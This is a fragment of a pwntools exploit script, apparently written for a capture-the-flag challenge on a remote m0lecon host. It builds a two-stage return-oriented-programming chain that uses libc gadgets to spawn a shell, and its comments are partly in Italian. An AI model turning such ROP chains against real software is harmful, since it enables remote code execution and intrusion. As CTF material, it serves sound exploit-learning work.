...
rop = ROP(elf)
#rop.print_gadgets()
HOST,PORT="offsec.m0lecon.it",13509
...
p.sendline(stage1)
p.recvuntil("The stars have spoken!\n")                        
...
#Now i can retreive the gadget needed from the libc (nowi have the right addresses) and the binary itself, in order to compose a valid rop chain that spawn a shell
...
stage2 = flat(
    ...
    p64(RET),   #alignment
    p64(POP_RDI),   #<-- metto in RDI (primo paramentro delle funzioni) quello che segue dopo
    p64(BINSH),     #<--- setto come parametro puts@got 
